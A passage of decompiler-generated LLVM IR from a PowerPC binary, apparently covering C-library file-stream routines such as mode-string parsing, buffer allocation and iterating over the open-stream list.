  store i32 ptrtoint (i32* @global_var_1000549c.225 to i32), i32* @lr, align 4
  %v0_10005498 = call i32 @function_100081f4()
  br label %dec_label_pc_100056d8

dec_label_pc_100054a0:                            ; preds = %dec_label_pc_10005434
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100054a4

dec_label_pc_100054a4:                            ; preds = %dec_label_pc_10005468, %dec_label_pc_1000545c, %dec_label_pc_100054a0
  %v0_100054c4 = phi i32 [ 1089, %dec_label_pc_10005468 ], [ 577, %dec_label_pc_1000545c ], [ 1, %dec_label_pc_100054a0 ]
  %v2_100054a4 = add i32 %tmp, 1
  %v3_100054a4 = inttoptr i32 %v2_100054a4 to i8*
  %v4_100054a4 = load i8, i8* %v3_100054a4, align 1
  %v5_100054a4 = zext i8 %v4_100054a4 to i32
  store i32 %v5_100054a4, i32* %r0.global-to-local, align 4
  %v3_100054ac = icmp eq i8 %v4_100054a4, 98
  br i1 %v3_100054ac, label %dec_label_pc_100054b8, label %dec_label_pc_100054b4

dec_label_pc_100054b4:                            ; preds = %dec_label_pc_100054a4
  br label %dec_label_pc_100054b8

dec_label_pc_100054b8:                            ; preds = %dec_label_pc_100054a4, %dec_label_pc_100054b4
  %storemerge = phi i32 [ %tmp, %dec_label_pc_100054b4 ], [ %v2_100054a4, %dec_label_pc_100054a4 ]
  %v0_100054b8 = phi i32 [ %tmp, %dec_label_pc_100054b4 ], [ %v2_100054a4, %dec_label_pc_100054a4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100054b8 = add i32 %v0_100054b8, 1
  %v2_100054b8 = inttoptr i32 %v1_100054b8 to i8*
  %v3_100054b8 = load i8, i8* %v2_100054b8, align 1
  %v4_100054b8 = zext i8 %v3_100054b8 to i32
  store i32 %v4_100054b8, i32* %r0.global-to-local, align 4
  %v3_100054bc = icmp eq i8 %v3_100054b8, 43
  br i1 %v3_100054bc, label %dec_label_pc_100054c4, label %dec_label_pc_100054cc

dec_label_pc_100054c4:                            ; preds = %dec_label_pc_100054b8
  store i32 %v0_100054c4, i32* %r9.global-to-local, align 4
  %v1_100054c8 = add nuw nsw i32 %v0_100054c4, 1
  store i32 %v1_100054c8, i32* @r28, align 4
  br label %dec_label_pc_100054cc

dec_label_pc_100054cc:                            ; preds = %dec_label_pc_100054b8, %dec_label_pc_100054c4
  %v3_100054cc = icmp eq i32 %v0_10005448, 0
  br i1 %v3_100054cc, label %dec_label_pc_100054d4, label %dec_label_pc_100054fc

dec_label_pc_100054d4:                            ; preds = %dec_label_pc_100054cc
  store i32 80, i32* @r3, align 4
  store i32 268457180, i32* @lr, align 4
  %v0_100054d8 = call i32 @function_1000809c()
  store i32 %v0_100054d8, i32* @r31, align 4
  %v4_100054dc = icmp eq i32 %v0_100054d8, 0
  br i1 %v4_100054dc, label %dec_label_pc_100056dc, label %dec_label_pc_100054e4

dec_label_pc_100054e4:                            ; preds = %dec_label_pc_100054d4
  %v1_100054e8 = add i32 %v0_100054d8, 56
  store i32 %v1_100054e8, i32* @r3, align 4
  %v3_100054ec = inttoptr i32 %v0_100054d8 to i16*
  store i16 8192, i16* %v3_100054ec, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100054f4 = load i32, i32* @r31, align 4
  %v2_100054f4 = add i32 %v1_100054f4, 8
  %v3_100054f4 = inttoptr i32 %v2_100054f4 to i32*
  store i32 0, i32* %v3_100054f4, align 4
  store i32 268457212, i32* @lr, align 4
  %v0_100054f8 = call i32 @function_10005768()
  %v0_100054fc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100054fc

dec_label_pc_100054fc:                            ; preds = %dec_label_pc_100054cc, %dec_label_pc_100054e4
  %v0_1000555c = phi i32 [ %v0_1000544c, %dec_label_pc_100054cc ], [ %v0_100054fc.pre, %dec_label_pc_100054e4 ]
  %v1_100054fc = icmp slt i32 %v0_1000555c, 0
  br i1 %v1_100054fc, label %dec_label_pc_1000555c, label %dec_label_pc_10005504

dec_label_pc_10005504:                            ; preds = %dec_label_pc_100054fc
  %v1_10005508 = add i32 %arg1, 1
  store i32 %v1_10005508, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_10005510 = load i32, i32* @r31, align 4
  %v2_10005510 = add i32 %v1_10005510, 4
  %v3_10005510 = inttoptr i32 %v2_10005510 to i32*
  store i32 %v0_1000555c, i32* %v3_10005510, align 4
  %v0_10005514 = load i32, i32* @r28, align 4
  %v1_10005514 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005514 = and i32 %v1_10005514, %v0_10005514
  %v1_10005518 = add i32 %v2_10005514, 1
  store i32 %v1_10005518, i32* %r9.global-to-local, align 4
  %v1_1000551c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000551c = and i32 %v1_1000551c, %v1_10005518
  store i32 %v2_1000551c, i32* %r0.global-to-local, align 4
  %v4_10005520 = icmp eq i32 %v2_1000551c, %v1_10005518
  br i1 %v4_10005520, label %dec_label_pc_10005528, label %dec_label_pc_10005474

dec_label_pc_10005528:                            ; preds = %dec_label_pc_10005504
  %v2_10005528 = sub i32 -1, %arg1
  %v3_10005528 = and i32 %v0_10005514, %v2_10005528
  store i32 %v3_10005528, i32* %r0.global-to-local, align 4
  %v1_1000552c = and i32 %v3_10005528, 1024
  store i32 %v1_1000552c, i32* %r9.global-to-local, align 4
  %v3_1000552c = icmp eq i32 %v1_1000552c, 0
  br i1 %v3_1000552c, label %dec_label_pc_10005550, label %dec_label_pc_10005534

dec_label_pc_10005534:                            ; preds = %dec_label_pc_10005528
  %v0_10005534 = load i32, i32* @r29, align 4
  store i32 268457288, i32* @lr, align 4
  %v2_10005544 = call i32 @function_100095a4(i32 %v0_10005534, i32 4)
  %v3_10005548 = icmp eq i32 %v2_10005544, 0
  br i1 %v3_10005548, label %dec_label_pc_10005550, label %dec_label_pc_10005474

dec_label_pc_10005550:                            ; preds = %dec_label_pc_10005534, %dec_label_pc_10005528
  %v1_10005550 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10005550, i32* %r0.global-to-local, align 4
  %v0_10005554 = load i32, i32* @r28, align 4
  %v2_10005554 = or i32 %v0_10005554, %v1_10005550
  store i32 %v2_10005554, i32* @r28, align 4
  br label %dec_label_pc_10005588

dec_label_pc_1000555c:                            ; preds = %dec_label_pc_100054fc
  %v3_1000555c = icmp eq i32 %v0_1000555c, -1
  %v0_1000556c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000555c, label %dec_label_pc_10005568, label %dec_label_pc_10005564

dec_label_pc_10005564:                            ; preds = %dec_label_pc_1000555c
  %v1_10005564 = or i32 %v0_1000556c.pre, 65536
  store i32 %v1_10005564, i32* @r28, align 4
  br label %dec_label_pc_10005568

dec_label_pc_10005568:                            ; preds = %dec_label_pc_1000555c, %dec_label_pc_10005564
  %v0_1000556c = phi i32 [ %v1_10005564, %dec_label_pc_10005564 ], [ %v0_1000556c.pre, %dec_label_pc_1000555c ]
  store i32 438, i32* @r5, align 4
  store i32 268457340, i32* @lr, align 4
  %v2_10005578 = call i32 @function_100098c0(i32 %arg1, i32 %v0_1000556c)
  %v1_1000557c = icmp slt i32 %v2_10005578, 0
  %v1_10005580 = load i32, i32* @r31, align 4
  %v2_10005580 = add i32 %v1_10005580, 4
  %v3_10005580 = inttoptr i32 %v2_10005580 to i32*
  store i32 %v2_10005578, i32* %v3_10005580, align 4
  br i1 %v1_1000557c, label %dec_label_pc_10005488, label %dec_label_pc_10005568.dec_label_pc_10005588_crit_edge

dec_label_pc_10005568.dec_label_pc_10005588_crit_edge: ; preds = %dec_label_pc_10005568
  %v0_1000558c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10005588

dec_label_pc_10005588:                            ; preds = %dec_label_pc_10005568.dec_label_pc_10005588_crit_edge, %dec_label_pc_10005550
  %v0_1000558c = phi i32 [ %v0_1000558c.pre, %dec_label_pc_10005568.dec_label_pc_10005588_crit_edge ], [ %v2_10005554, %dec_label_pc_10005550 ]
  %v0_10005588 = load i32, i32* @r31, align 4
  %v1_10005588 = inttoptr i32 %v0_10005588 to i16*
  %v2_10005588 = load i16, i16* %v1_10005588, align 2
  %v3_10005588 = zext i16 %v2_10005588 to i32
  store i32 %v3_10005588, i32* %r0.global-to-local, align 4
  %v1_1000558c = urem i32 %v0_1000558c, 4
  store i32 %v1_1000558c, i32* %r29.global-to-local, align 4
  %v1_10005590 = call i32 @__asm_rlwinm(i32 %v0_1000558c, i32 0, i32 21, i32 21)
  %v1_10005594 = add nuw nsw i32 %v1_1000558c, 1
  %v1_10005598 = xor i32 %v1_10005594, 3
  store i32 %v1_10005598, i32* %r29.global-to-local, align 4
  %v1_1000559c = call i32 @__asm_rlwinm(i32 %v3_10005588, i32 0, i32 18, i32 18)
  %v2_1000559c = trunc i32 %v1_1000559c to i16
  store i32 %v1_1000559c, i32* %r0.global-to-local, align 4
  %v1_100055a0 = mul nuw nsw i32 %v1_10005598, 16
  store i32 %v1_100055a0, i32* %r29.global-to-local, align 4
  %v3_100055a4 = load i32, i32* @r31, align 4
  %v4_100055a4 = inttoptr i32 %v3_100055a4 to i16*
  store i16 %v2_1000559c, i16* %v4_100055a4, align 2
  %v0_100055a8 = load i32, i32* @r28, align 4
  %v1_100055a8 = call i32 @__asm_rlwinm(i32 %v0_100055a8, i32 31, i32 16, i32 16)
  %v2_100055ac = or i32 %v1_100055a8, %v1_10005590
  store i32 %v2_100055ac, i32* %r0.global-to-local, align 4
  %v0_100055b0 = load i32, i32* @r31, align 4
  %v1_100055b0 = inttoptr i32 %v0_100055b0 to i16*
  %v2_100055b0 = load i16, i16* %v1_100055b0, align 2
  %v3_100055b0 = zext i16 %v2_100055b0 to i32
  %v2_100055b4 = or i32 %v3_100055b0, %v2_100055ac
  store i32 %v2_100055b4, i32* %r9.global-to-local, align 4
  %v0_100055b8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100055b8 = or i32 %v2_100055b4, %v0_100055b8
  store i32 %v2_100055b8, i32* @r29, align 4
  %v1_100055bc = trunc i32 %v2_100055b8 to i16
  store i16 %v1_100055bc, i16* %v1_100055b0, align 2
  %v0_100055c0 = call i32 @function_10004e38()
  store i32 %v0_100055c0, i32* @r28, align 4
  %v0_100055c8 = load i32, i32* @r31, align 4
  %v1_100055c8 = add i32 %v0_100055c8, 4
  %v2_100055c8 = inttoptr i32 %v1_100055c8 to i32*
  %v3_100055c8 = load i32, i32* %v2_100055c8, align 4
  %v1_100055cc = inttoptr i32 %v0_100055c0 to i32*
  %v2_100055cc = load i32, i32* %v1_100055cc, align 4
  store i32 %v2_100055cc, i32* @r27, align 4
  store i32 268457428, i32* @lr, align 4
  %v1_100055d0 = call i32 @function_100077b8(i32 %v3_100055c8)
  %v1_100055d4 = mul i32 %v1_100055d0, 256
  %v0_100055d8 = load i32, i32* @r29, align 4
  %v2_100055d8 = or i32 %v0_100055d8, %v1_100055d4
  store i32 %v2_100055d8, i32* @r29, align 4
  %v1_100055dc = trunc i32 %v2_100055d8 to i16
  %v2_100055dc = load i32, i32* @r31, align 4
  %v3_100055dc = inttoptr i32 %v2_100055dc to i16*
  store i16 %v1_100055dc, i16* %v3_100055dc, align 2
  %v0_100055e0 = load i32, i32* @r27, align 4
  %v1_100055e0 = load i32, i32* @r28, align 4
  %v2_100055e0 = inttoptr i32 %v1_100055e0 to i32*
  store i32 %v0_100055e0, i32* %v2_100055e0, align 4
  %v0_100055e4 = load i32, i32* @r31, align 4
  %v1_100055e4 = add i32 %v0_100055e4, 8
  %v2_100055e4 = inttoptr i32 %v1_100055e4 to i32*
  %v3_100055e4 = load i32, i32* %v2_100055e4, align 4
  store i32 %v3_100055e4, i32* %r0.global-to-local, align 4
  %v3_100055e8 = icmp eq i32 %v3_100055e4, 0
  br i1 %v3_100055e8, label %dec_label_pc_100055f0, label %dec_label_pc_10005620

dec_label_pc_100055f0:                            ; preds = %dec_label_pc_10005588
  store i32 4096, i32* @r3, align 4
  store i32 268457464, i32* @lr, align 4
  %v0_100055f4 = call i32 @function_1000809c()
  %v3_100055f8 = icmp eq i32 %v0_100055f4, 0
  %v1_100055fc = load i32, i32* @r31, align 4
  %v2_100055fc = add i32 %v1_100055fc, 8
  %v3_100055fc = inttoptr i32 %v2_100055fc to i32*
  store i32 %v0_100055f4, i32* %v3_100055fc, align 4
  %v1_1000561c = load i32, i32* @r31, align 4
  br i1 %v3_100055f8, label %dec_label_pc_1000561c, label %dec_label_pc_10005604

dec_label_pc_10005604:                            ; preds = %dec_label_pc_100055f0
  %v1_10005604 = inttoptr i32 %v1_1000561c to i16*
  %v2_10005604 = load i16, i16* %v1_10005604, align 2
  %v3_10005604 = zext i16 %v2_10005604 to i32
  store i32 %v3_10005604, i32* %r0.global-to-local, align 4
  %v1_10005608 = add i32 %v0_100055f4, 4096
  store i32 %v1_10005608, i32* %r9.global-to-local, align 4
  %v2_1000560c = add i32 %v1_1000561c, 12
  %v3_1000560c = inttoptr i32 %v2_1000560c to i32*
  store i32 %v1_10005608, i32* %v3_1000560c, align 4
  %v0_10005610 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005610 = or i32 %v0_10005610, 16384
  store i32 %v1_10005610, i32* %r0.global-to-local, align 4
  %v1_10005614 = trunc i32 %v1_10005610 to i16
  %v2_10005614 = load i32, i32* @r31, align 4
  %v3_10005614 = inttoptr i32 %v2_10005614 to i16*
  store i16 %v1_10005614, i16* %v3_10005614, align 2
  br label %dec_label_pc_10005620

dec_label_pc_1000561c:                            ; preds = %dec_label_pc_100055f0
  %v2_1000561c = add i32 %v1_1000561c, 12
  %v3_1000561c = inttoptr i32 %v2_1000561c to i32*
  store i32 0, i32* %v3_1000561c, align 4
  br label %dec_label_pc_10005620

dec_label_pc_10005620:                            ; preds = %dec_label_pc_10005588, %dec_label_pc_10005604, %dec_label_pc_1000561c
  %v0_10005620 = load i32, i32* @r31, align 4
  %v1_10005620 = add i32 %v0_10005620, 8
  %v2_10005620 = inttoptr i32 %v1_10005620 to i32*
  %v3_10005620 = load i32, i32* %v2_10005620, align 4
  store i32 %v3_10005620, i32* %r9.global-to-local, align 4
  %v3_10005628 = add i32 %v0_10005620, 2
  %v4_10005628 = inttoptr i32 %v3_10005628 to i8*
  store i8 0, i8* %v4_10005628, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10005630 = load i32, i32* @r31, align 4
  %v2_10005630 = add i32 %v1_10005630, 44
  %v3_10005630 = inttoptr i32 %v2_10005630 to i32*
  store i32 0, i32* %v3_10005630, align 4
  %v0_10005634 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005634 = load i32, i32* @r31, align 4
  %v2_10005634 = add i32 %v1_10005634, 20
  %v3_10005634 = inttoptr i32 %v2_10005634 to i32*
  store i32 %v0_10005634, i32* %v3_10005634, align 4
  %v0_10005638 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005638 = load i32, i32* @r31, align 4
  %v2_10005638 = add i32 %v1_10005638, 24
  %v3_10005638 = inttoptr i32 %v2_10005638 to i32*
  store i32 %v0_10005638, i32* %v3_10005638, align 4
  %v0_1000563c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000563c = load i32, i32* @r31, align 4
  %v2_1000563c = add i32 %v1_1000563c, 28
  %v3_1000563c = inttoptr i32 %v2_1000563c to i32*
  store i32 %v0_1000563c, i32* %v3_1000563c, align 4
  %v0_10005640 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005640 = load i32, i32* @r31, align 4
  %v2_10005640 = add i32 %v1_10005640, 16
  %v3_10005640 = inttoptr i32 %v2_10005640 to i32*
  store i32 %v0_10005640, i32* %v3_10005640, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v0_10005648 = load i32, i32* @r31, align 4
  %v1_10005648 = inttoptr i32 %v0_10005648 to i16*
  %v2_10005648 = load i16, i16* %v1_10005648, align 2
  %v3_10005648 = zext i16 %v2_10005648 to i32
  %v3_1000564c = load i32, i32* @global_var_1001043c.226, align 4
  store i32 %v3_1000564c, i32* %r0.global-to-local, align 4
  %v1_10005650 = and i32 %v3_10005648, 8192
  store i32 %v1_10005650, i32* %r9.global-to-local, align 4
  %v3_10005650 = icmp eq i32 %v1_10005650, 0
  %v2_10005654 = add i32 %v0_10005648, 52
  %v3_10005654 = inttoptr i32 %v2_10005654 to i32*
  store i32 %v3_1000564c, i32* %v3_10005654, align 4
  br i1 %v3_10005650, label %dec_label_pc_100056dc, label %dec_label_pc_1000565c

dec_label_pc_1000565c:                            ; preds = %dec_label_pc_10005620
  store i32 ptrtoint ([3 x i8]* @global_var_100091f4.205 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* %r29.global-to-local, align 4
  %v2_1000566c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000566c, i32* @r26, align 4
  store i32 %v2_1000566c, i32* @r3, align 4
  %v0_1000567c = call i32 @function_100091fc()
  %v2_10005688 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10005688, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.227 to i32), i32* @r29, align 4
  %v0_10005690 = call i32 @function_100091f4()
  store i32 %v2_10005688, i32* @r3, align 4
  %v0_100056a0 = call i32 @function_100091fc()
  %v0_100056a8 = call i32 @function_100091f4()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_100056b0 = load i32, i32* bitcast (i32** @global_var_10010438.228 to i32*), align 4
  store i32 %v3_100056b0, i32* %r0.global-to-local, align 4
  store i32 %v2_10005688, i32* @r3, align 4
  %v1_100056bc = load i32, i32* @r31, align 4
  %v2_100056bc = add i32 %v1_100056bc, 32
  %v3_100056bc = inttoptr i32 %v2_100056bc to i32*
  store i32 %v3_100056b0, i32* %v3_100056bc, align 4
  %v0_100056c0 = load i32, i32* @r31, align 4
  store i32 %v0_100056c0, i32* bitcast (i32** @global_var_10010438.228 to i32*), align 4
  %v0_100056c4 = call i32 @function_100091fc()
  store i32 %v2_1000566c, i32* @r3, align 4
  %v0_100056d0 = call i32 @function_100091fc()
  br label %dec_label_pc_100056dc

dec_label_pc_100056d8:                            ; preds = %dec_label_pc_10005488, %dec_label_pc_10005474, %dec_label_pc_10005494
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100056dc

dec_label_pc_100056dc:                            ; preds = %dec_label_pc_10005620, %dec_label_pc_100054d4, %dec_label_pc_1000565c, %dec_label_pc_100056d8
  store i32 %v0_10005438, i32* %r0.global-to-local, align 4
  %v0_100056e0 = load i32, i32* @r31, align 4
  ret i32 %v0_100056e0

; uselistorder directives
  uselistorder i32 %v1_1000561c, { 2, 0, 1 }
  uselistorder i32 %v1_1000559c, { 1, 0 }
  uselistorder i32 %v0_1000558c, { 1, 0 }
  uselistorder i32 %v0_100054d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100054c4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16 }
  uselistorder i8 114, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100056dc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100056d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005620, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005568, { 1, 0 }
  uselistorder label %dec_label_pc_100054fc, { 1, 0 }
  uselistorder label %dec_label_pc_100054cc, { 1, 0 }
  uselistorder label %dec_label_pc_100054b8, { 1, 0 }
  uselistorder label %dec_label_pc_100054a4, { 2, 0, 1 }
}

define i32 @function_100056f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100056f4:
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r28, align 4
  %v0_10005708 = call i32 @function_10004e38()
  store i32 %v0_10005708, i32* @r26, align 4
  %v1_10005714 = inttoptr i32 %v0_10005708 to i32*
  %v2_10005714 = load i32, i32* %v1_10005714, align 4
  store i32 %v2_10005714, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_10010114.201 to i32), i32* @r27, align 4
  %v3_1000571c = load i16, i16* @global_var_10010114.201, align 2
  %v4_1000571c = zext i16 %v3_1000571c to i32
  store i32 %v4_1000571c, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005724.230 to i32), i32* @lr, align 4
  %v1_10005720 = call i32 @function_100077b8(i32 0)
  %v1_10005724 = sub i32 1, %v1_10005720
  %v1_10005728 = mul i32 %v1_10005724, 256
  %v0_1000572c = load i32, i32* @r29, align 4
  %v2_1000572c = xor i32 %v1_10005728, %v0_1000572c
  %v1_10005734 = trunc i32 %v2_1000572c to i16
  store i16 %v1_10005734, i16* @global_var_10010114.201, align 2
  %v3_10005738 = load i16, i16* @global_var_10010164.202, align 2
  %v4_10005738 = zext i16 %v3_10005738 to i32
  store i32 %v4_10005738, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005740.231 to i32), i32* @lr, align 4
  %v1_1000573c = call i32 @function_100077b8(i32 1)
  %v1_10005740 = sub i32 1, %v1_1000573c
  %v1_10005744 = mul i32 %v1_10005740, 256
  %v0_10005748 = load i32, i32* @r29, align 4
  %v2_10005748 = xor i32 %v1_10005744, %v0_10005748
  %v1_1000574c = trunc i32 %v2_10005748 to i16
  store i16 %v1_1000574c, i16* @global_var_10010164.202, align 2
  %v0_10005750 = load i32, i32* @r25, align 4
  %v1_10005750 = load i32, i32* @r26, align 4
  %v2_10005750 = inttoptr i32 %v1_10005750 to i32*
  store i32 %v0_10005750, i32* %v2_10005750, align 4
  ret i32 %v1_10005744

; uselistorder directives
  uselistorder i32 %v1_10005744, { 1, 0 }
  uselistorder i16* @global_var_10010164.202, { 1, 0 }
}

define i32 @function_10005768() local_unnamed_addr {
dec_label_pc_10005768:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000e5b8.232 to i32), i32* @r4, align 4
  %v0_10005774 = call i32 @function_10007104()
  ret i32 %v0_10005774
}

define i32 @function_10005778(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005778:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100100e4.227 to i32), i32* @r3, align 4
  store i32 268457876, i32* @lr, align 4
  %v0_10005790 = call i32 @function_10005768()
  store i32 ptrtoint (i32* @global_var_100100fc.206 to i32), i32* @r3, align 4
  store i32 268457888, i32* @lr, align 4
  %v0_1000579c = call i32 @function_10005768()
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10010438.228 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100057e89 = icmp eq i32 %storemerge6, 0
  %v1_100057ec11 = add i32 %storemerge6, 56
  store i32 %v1_100057ec11, i32* %r30.global-to-local, align 4
  br i1 %v3_100057e89, label %dec_label_pc_100057f8, label %dec_label_pc_100057ac

dec_label_pc_100057ac:                            ; preds = %dec_label_pc_10005778, %dec_label_pc_100057d8
  %v0_100057ac = call i32 @function_100091f4()
  %v3_100057b0 = icmp eq i32 %v0_100057ac, 0
  %v0_100057b4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100057b4, i32* @r3, align 4
  br i1 %v3_100057b0, label %dec_label_pc_100057d8, label %dec_label_pc_100057bc

dec_label_pc_100057bc:                            ; preds = %dec_label_pc_100057ac
  %v0_100057bc = load i32, i32* %r31.global-to-local, align 4
  %v1_100057bc = add i32 %v0_100057bc, 8
  %v2_100057bc = inttoptr i32 %v1_100057bc to i32*
  %v3_100057bc = load i32, i32* %v2_100057bc, align 4
  store i32 %v3_100057bc, i32* %r9.global-to-local, align 4
  %v3_100057c4 = inttoptr i32 %v0_100057bc to i16*
  store i16 48, i16* %v3_100057c4, align 2
  %v0_100057c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100057c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100057c8 = add i32 %v1_100057c8, 20
  %v3_100057c8 = inttoptr i32 %v2_100057c8 to i32*
  store i32 %v0_100057c8, i32* %v3_100057c8, align 4
  %v0_100057cc = load i32, i32* %r9.global-to-local, align 4
  %v1_100057cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100057cc = add i32 %v1_100057cc, 24
  %v3_100057cc = inttoptr i32 %v2_100057cc to i32*
  store i32 %v0_100057cc, i32* %v3_100057cc, align 4
  %v0_100057d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100057d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100057d0 = add i32 %v1_100057d0, 28
  %v3_100057d0 = inttoptr i32 %v2_100057d0 to i32*
  store i32 %v0_100057d0, i32* %v3_100057d0, align 4
  %v0_100057d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100057d4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100057d4 = add i32 %v1_100057d4, 16
  %v3_100057d4 = inttoptr i32 %v2_100057d4 to i32*
  store i32 %v0_100057d4, i32* %v3_100057d4, align 4
  br label %dec_label_pc_100057d8

dec_label_pc_100057d8:                            ; preds = %dec_label_pc_100057ac, %dec_label_pc_100057bc
  %v1_100057dc = load i32, i32* %r31.global-to-local, align 4
  %v2_100057dc = add i32 %v1_100057dc, 52
  %v3_100057dc = inttoptr i32 %v2_100057dc to i32*
  store i32 1, i32* %v3_100057dc, align 4
  store i32 268457956, i32* @lr, align 4
  %v0_100057e0 = call i32 @function_10005768()
  %v0_100057e4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100057e4 = add i32 %v0_100057e4, 32
  %v2_100057e4 = inttoptr i32 %v1_100057e4 to i32*
  %storemerge = load i32, i32* %v2_100057e4, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100057e8 = icmp eq i32 %storemerge, 0
  %v1_100057ec = add i32 %storemerge, 56
  store i32 %v1_100057ec, i32* %r30.global-to-local, align 4
  br i1 %v3_100057e8, label %dec_label_pc_100057e8.dec_label_pc_100057f8_crit_edge, label %dec_label_pc_100057ac

dec_label_pc_100057e8.dec_label_pc_100057f8_crit_edge: ; preds = %dec_label_pc_100057d8
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_10010438.228 to i32*), align 4
  br label %dec_label_pc_100057f8

dec_label_pc_100057f8:                            ; preds = %dec_label_pc_100057e8.dec_label_pc_100057f8_crit_edge, %dec_label_pc_10005778
  %v0_1000583416 = phi i32 [ %v1_100057ec, %dec_label_pc_100057e8.dec_label_pc_100057f8_crit_edge ], [ %v1_100057ec11, %dec_label_pc_10005778 ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100057e8.dec_label_pc_100057f8_crit_edge ], [ 0, %dec_label_pc_10005778 ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_1000581c5 = icmp eq i32 %storemerge12, 0
  br i1 %v3_1000581c5, label %dec_label_pc_10005824, label %dec_label_pc_10005804

dec_label_pc_10005804:                            ; preds = %dec_label_pc_100057f8, %dec_label_pc_10005818
  %v0_10005804 = phi i32 [ %storemerge1, %dec_label_pc_10005818 ], [ %storemerge12, %dec_label_pc_100057f8 ]
  %v1_10005804 = inttoptr i32 %v0_10005804 to i16*
  %v2_10005804 = load i16, i16* %v1_10005804, align 2
  %v3_10005804 = zext i16 %v2_10005804 to i32
  store i32 %v0_10005804, i32* @r3, align 4
  %v1_1000580c = and i32 %v3_10005804, 64
  store i32 %v1_1000580c, i32* %r9.global-to-local, align 4
  %v3_1000580c = icmp eq i32 %v1_1000580c, 0
  br i1 %v3_1000580c, label %dec_label_pc_10005818, label %dec_label_pc_10005814

dec_label_pc_10005814:                            ; preds = %dec_label_pc_10005804
  store i32 268458008, i32* @lr, align 4
  %v0_10005814 = call i32 @function_10005838()
  %v0_10005818.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005818

dec_label_pc_10005818:                            ; preds = %dec_label_pc_10005804, %dec_label_pc_10005814
  %v0_10005818 = phi i32 [ %v0_10005804, %dec_label_pc_10005804 ], [ %v0_10005818.pre, %dec_label_pc_10005814 ]
  %v0_1000583417 = phi i32 [ %v0_10005804, %dec_label_pc_10005804 ], [ %v0_10005814, %dec_label_pc_10005814 ]
  %v1_10005818 = add i32 %v0_10005818, 32
  %v2_10005818 = inttoptr i32 %v1_10005818 to i32*
  %storemerge1 = load i32, i32* %v2_10005818, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_1000581c = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000581c, label %dec_label_pc_10005824, label %dec_label_pc_10005804

dec_label_pc_10005824:                            ; preds = %dec_label_pc_10005818, %dec_label_pc_100057f8
  %v0_10005834 = phi i32 [ %v0_1000583416, %dec_label_pc_100057f8 ], [ %v0_1000583417, %dec_label_pc_10005818 ]
  ret i32 %v0_10005834

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_10005804, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @function_10005768, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_10005818, { 1, 0 }
